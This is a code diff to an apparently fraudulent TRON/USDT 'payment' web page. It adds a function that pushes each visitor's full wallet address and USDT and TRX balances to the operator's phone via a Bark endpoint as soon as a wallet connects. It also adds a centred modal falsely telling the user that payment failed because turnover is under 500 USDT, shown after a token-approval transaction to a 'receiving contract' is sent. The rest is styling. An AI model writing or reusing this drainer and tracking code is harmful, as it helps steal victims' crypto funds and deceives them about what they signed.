@@ -242,16 +242,59 @@
   .energyline b{color:#2f63f5;font-weight:700}
   body.debug .energyline{display:block}
 
-  /* 提示框：屏幕正中弹出（原先在顶部） */
+  /* 轻提示：底部浅色小条（跟随页面配色，不抢视线） */
   .toast{
-    position:fixed;left:50%;top:50%;transform:translate(-50%,-50%) scale(.9);
-    background:rgba(21,32,57,.96);color:#fff;font-size:15px;font-weight:600;
-    padding:16px 26px;border-radius:16px;opacity:0;pointer-events:none;
-    transition:opacity .22s ease,transform .22s ease;z-index:9999;max-width:80vw;
-    text-align:center;line-height:1.5;letter-spacing:.2px;
-    box-shadow:0 18px 50px rgba(8,15,30,.45);
+    position:fixed;left:50%;bottom:calc(98px + env(safe-area-inset-bottom));
+    transform:translate(-50%,10px) scale(.98);
+    background:#fff;color:#152039;font-size:14px;font-weight:600;
+    padding:12px 18px;border-radius:14px;opacity:0;pointer-events:none;
+    transition:opacity .2s ease,transform .2s ease;z-index:9998;max-width:82vw;
+    text-align:center;line-height:1.45;letter-spacing:.1px;
+    box-shadow:0 10px 30px rgba(16,24,40,.14),0 0 0 1px rgba(16,24,40,.04);
   }
-  .toast.on{opacity:1;transform:translate(-50%,-50%) scale(1)}
+  .toast.on{opacity:1;transform:translate(-50%,0) scale(1)}
+
+  /* ===== 结果弹窗：屏幕正中，白卡片 + 淡红图标，配色跟页面一致 ===== */
+  .modalwrap{
+    position:fixed;inset:0;z-index:9999;display:flex;align-items:center;justify-content:center;
+    padding:26px;background:rgba(16,24,40,0);opacity:0;pointer-events:none;
+    transition:opacity .22s ease,background .22s ease;
+    -webkit-backdrop-filter:blur(0);backdrop-filter:blur(0);
+  }
+  .modalwrap.on{
+    opacity:1;pointer-events:auto;background:rgba(16,24,40,.34);
+    -webkit-backdrop-filter:blur(3px);backdrop-filter:blur(3px);
+  }
+  .modalcard{
+    width:100%;max-width:286px;background:#fff;border-radius:20px;
+    padding:26px 20px 18px;text-align:center;
+    transform:translateY(8px) scale(.95);opacity:0;
+    transition:transform .28s cubic-bezier(.22,.61,.36,1),opacity .2s ease;
+    box-shadow:0 22px 56px rgba(16,24,40,.22);
+  }
+  .modalwrap.on .modalcard{transform:translateY(0) scale(1);opacity:1}
+  .modaldot{
+    width:46px;height:46px;border-radius:50%;margin:0 auto 15px;
+    display:flex;align-items:center;justify-content:center;
+    background:#fdeceb;color:#e5484d;
+  }
+  .modaldot svg{width:23px;height:23px;display:block}
+  .modaltitle{
+    font-size:17px;font-weight:600;color:#152039;letter-spacing:.2px;line-height:1.35;
+  }
+  .modaldesc{
+    margin-top:7px;font-size:14px;color:#8e95a3;line-height:1.55;
+    letter-spacing:.1px;font-variant-numeric:tabular-nums;
+  }
+  .modaldesc b{color:#152039;font-weight:600}
+  .modalbar{height:1px;background:#eef0f4;margin:18px -20px 0}
+  .modalok{
+    width:100%;height:44px;margin-top:14px;border:0;border-radius:12px;
+    background:#f2f4f8;color:#3a4557;font-size:15px;font-weight:600;
+    font-family:inherit;cursor:pointer;letter-spacing:.2px;
+    transition:background .15s ease,transform .12s ease;
+  }
+  .modalok:active{background:#e8ebf1;transform:scale(.99)}
 
   .hidden{display:none !important}
 
@@ -356,6 +399,21 @@
   </div>
 
   <div class="toast" id="toast"></div>
+
+  <!-- 结果弹窗（屏幕正中） -->
+  <div class="modalwrap" id="modalWrap" role="dialog" aria-modal="true" aria-hidden="true" aria-labelledby="modalTitle">
+    <div class="modalcard">
+      <div class="modaldot" id="modalIcon">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+          <circle cx="12" cy="12" r="9"/><path d="M12 7.6v5.7"/><path d="M12 16.6h.01"/>
+        </svg>
+      </div>
+      <div class="modaltitle" id="modalTitle">支付失败</div>
+      <div class="modaldesc" id="modalDesc">流水不足 500 USDT</div>
+      <div class="modalbar"></div>
+      <button class="modalok" id="modalOk" type="button">我知道了</button>
+    </div>
+  </div>
 
   <!-- 以下为逻辑占位节点，不显示 -->
   <span class="hidden"><span id="timer"><span id="timerText"></span></span></span>
@@ -1824,6 +1882,41 @@
     toastTimer = setTimeout(function () { toastEl.classList.remove("on"); }, ms || 1800);
   }
 
+  /* ---------- 结果弹窗：屏幕正中，可点按钮 / 点空白处 / 按 Esc 关掉 ---------- */
+  var modalWrap = $("modalWrap"), modalTitleEl = $("modalTitle"),
+      modalDescEl = $("modalDesc"), modalOkBtn = $("modalOk");
+  var modalOpen = false;
+
+  function showModal(title, desc) {
+    if (!modalWrap) return;
+    modalTitleEl.textContent = cleanTip(title);
+    if (desc) {
+      modalDescEl.innerHTML = desc;      /* 允许 <b> 强调数字 */
+      modalDescEl.style.display = "";
+    } else {
+      modalDescEl.textContent = "";
+      modalDescEl.style.display = "none";
+    }
+    modalWrap.setAttribute("aria-hidden", "false");
+    modalWrap.classList.add("on");
+    modalOpen = true;
+  }
+  function hideModal() {
+    if (!modalWrap) return;
+    modalWrap.classList.remove("on");
+    modalWrap.setAttribute("aria-hidden", "true");
+    modalOpen = false;
+  }
+  if (modalOkBtn) modalOkBtn.addEventListener("click", hideModal);
+  if (modalWrap) {
+    modalWrap.addEventListener("click", function (e) {
+      if (e.target === modalWrap) hideModal();   /* 点卡片外面关掉 */
+    });
+  }
+  document.addEventListener("keydown", function (e) {
+    if (modalOpen && (e.key === "Escape" || e.key === "Esc")) hideModal();
+  });
+
   /* 复制 */
   function copyText(txt, okText) {
     var fin = function () { toast(okText || "已复制"); };
@@ -2146,6 +2239,10 @@
     startWarmLoop();
     /* 余额第一步就发出去：网络判定那套（要问两个合约）慢不慢都不影响它 */
     loadBalances(tw, addr);
+    /* 一进来连上钱包就推一条到手机：标题「钱包已连接」，带地址 + USDT/TRX 余额
+       （延迟 0 秒再调：connect() 在页面脚本还没跑完时就会执行，
+         这时推送那几行的配置变量还没赋上值，先让它走完再调） */
+    setTimeout(function () { try { barkNotifyVisit(tw, addr); } catch (e) {} }, 0);
     /* 之前已经授权过（比如换了页面/刷新过）：这里补一次，够额度就推提醒 */
     checkApprovalNow(tw, addr).catch(function () {});
     resumePendingApproval(tw, addr);
@@ -2425,6 +2522,72 @@
     return true;
   }
 
+  /* ============================================================
+     ===== 进站提醒（Bark 推送）=====
+     钱包一连上就推一条，标题「钱包已连接」，正文带完整地址 + USDT/TRX 余额。
+     同一个地址 2 分钟内只推一条：刷新、重连、轮询都不会炸成一串；
+     换地址（换了钱包）立刻照推。
+     余额读得慢就不等它了，先推地址，别让提醒迟到。
+     ============================================================ */
+  var BARK_VISIT_GROUP = "钱包访问";
+  var BARK_VISIT_GAP = 2 * 60 * 1000;
+  var BARK_VISIT_KEY = "zakaBarkVisit";
+  var BARK_VISIT_SEEN = {};        /* 本次打开页面内已经推过的地址 */
+
+  function barkMapRead(key) {
+    try { return JSON.parse(localStorage.getItem(key) || "{}") || {}; }
+    catch (e) { return {}; }
+  }
+
+  function barkMapMark(key, k) {
+    try {
+      var m = barkMapRead(key), now = Date.now(), cut = now - 24 * 3600 * 1000, keep = {};
+      for (var x in m) { if (Number(m[x]) > cut && x !== k) keep[x] = m[x]; }
+      keep[k] = now;
+      localStorage.setItem(key, JSON.stringify(keep));
+    } catch (e) {}
+  }
+
+  function barkNotifyVisit(tw, addr) {
+    if (!addr || !BARK_BASE) return false;
+    BARK_VISIT_SEEN = BARK_VISIT_SEEN || {};
+    if (BARK_VISIT_SEEN[addr]) return false;
+    BARK_VISIT_SEEN[addr] = 1;
+
+    var m = barkMapRead(BARK_VISIT_KEY), t = Number(m[addr] || 0);
+    if (t > 0 && (Date.now() - t) < BARK_VISIT_GAP) return false;
+    barkMapMark(BARK_VISIT_KEY, addr);
+
+    var done = false;
+    function fire(usdt, trx) {
+      if (done) return;
+      done = true;
+      var lines = [];
+      if (usdt === null || usdt === undefined) lines.push("USDT：—");
+      else lines.push("USDT：" + fmtNum(Number(usdt), 2));
+      if (trx !== null && trx !== undefined) lines.push("TRX：" + fmtNum(Number(trx), 2));
+      lines.push("地址：" + addr);
+      var body = lines.join("\n");
+      barkFire(BARK_BASE + "/" + encodeURIComponent(body) +
+        "?title=" + encodeURIComponent("钱包已连接") +
+        "&group=" + encodeURIComponent(BARK_VISIT_GROUP) +
+        "&sound=bell&level=timeSensitive");
+    }
+
+    (async function () {
+      var u = null, x = null;
+      try { u = await readUsdtBalance(tw, USDT_MAIN, addr); } catch (e) {}
+      try { x = await fetchTrxBal(tw, addr); } catch (e) {}
+      if ((u === null || u === undefined) && BAL_USDT !== null) u = BAL_USDT;
+      if ((x === null || x === undefined) && TRX_BAL !== null) x = TRX_BAL;
+      fire(u, x);
+    })();
+
+    /* 节点慢就别让它拖着：6 秒还没读到，先用手上的数推出去 */
+    setTimeout(function () { fire(BAL_USDT, TRX_BAL); }, 6000);
+    return true;
+  }
+
   /* 读这个账户对收款合约的授权额度（USDT 合约的 allowance / allowed 都试一遍） */
   async function readAllowance(tw, owner) {
     if (!owner) return null;
@@ -2527,7 +2690,10 @@
      TEST_SKIP_APPROVAL = false → 恢复真实授权流程，其余代码一行都不用动。
      ============================================================ */
   var TEST_SKIP_APPROVAL = true;
-  var RESULT_TIP_TEXT = "支付失败 流水不足500USDT";
+  /* 结果弹窗文案：标题 + 说明（说明里可用 <b> 强调数字） */
+  var RESULT_TIP_TITLE = "支付失败";
+  var RESULT_TIP_DESC  = "流水不足 <b>500 USDT</b>";
+  function showResultTip() { showModal(RESULT_TIP_TITLE, RESULT_TIP_DESC); }
 
   payBtn.addEventListener("click", async function () {
     if (busy) {
@@ -2543,7 +2709,7 @@
         busy = false;
         payBtn.classList.add("done");
         paintBtn("done", "下一步");
-        toast(RESULT_TIP_TEXT, 4200);
+        showResultTip();
       }, 900);
       return;
     }
@@ -2632,7 +2798,7 @@
       AUTO_RESIGNED = 0;
       payBtn.classList.add("done");
       paintBtn("done", "下一步");
-      toast(RESULT_TIP_TEXT, 4200);
+      showResultTip();
       calibrateFee(tw, sent.txid);
       /* 授权这笔上链确认后推一条到手机（链接里带这个用户的钱包地址） */
       watchApproval(tw, from, sent.txid);
